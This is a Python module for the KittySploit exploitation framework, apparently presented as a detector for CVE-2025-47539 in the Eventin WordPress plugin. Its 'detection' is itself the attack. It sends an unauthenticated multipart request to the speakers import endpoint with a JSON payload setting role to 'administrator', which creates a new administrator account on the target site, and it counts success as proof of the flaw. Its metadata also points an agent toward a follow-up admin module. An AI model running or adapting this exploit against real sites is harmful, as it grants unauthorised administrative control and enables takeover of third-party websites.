#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Eventin <= 4.0.26 unauthenticated speaker import privesc (CVE-2025-47539)."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "eventin"
_VULN_HIGH = (4, 0, 26)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Eventin CVE-2025-47539 detect",
        "description": (
            "Detects CVE-2025-47539: POST /wp-json/eventin/v2/speakers/import allows "
            "role=administrator without authentication."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-47539",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-47539"],
        "modules": ["auxiliary/admin/http/eventin_cve_2025_47539_speaker_import"],
        "tags": ["web", "scanner", "wordpress", "eventin", "cve-2025-47539"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["auxiliary/admin/http/eventin_cve_2025_47539_speaker_import"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _multipart(self, name: str, email: str) -> bytes:
        boundary = "----KittySploitBoundary"
        payload = json.dumps(
            [
                {
                    "id": "999",
                    "name": name,
                    "email": email,
                    "image": "",
                    "designation": "test",
                    "summary": "",
                    "social": [[]],
                    "company_logo": "",
                    "company_url": "",
                    "speaker_group": "",
                    "speaker_category": ["speaker"],
                    "company_name": "",
                    "author_url": "",
                    "role": "administrator",
                }
            ]
        )
        parts = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="speaker_import"; filename="speakers.json"\r\n'
            f"Content-Type: application/json\r\n\r\n"
            f"{payload}\r\n"
            f"--{boundary}--\r\n"
        )
        return parts.encode(), boundary

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        user = f"ks{secrets.token_hex(3)}"
        email = f"{user}@example.test"
        body, boundary = self._multipart(user, email)
        r = self.http_request(
            method="POST",
            path=self._join("/wp-json/eventin/v2/speakers/import"),
            params={"_locale": "user"},
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            data=body,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        text = r.text or ""
        if "Successfully imported speaker" in text:
            self.set_info(
                severity="critical",
                reason=f"Eventin CVE-2025-47539 — admin speaker import ({email})",
                path="/wp-json/eventin/v2/speakers/import",
                cve="CVE-2025-47539",
            )
            return True
        return False
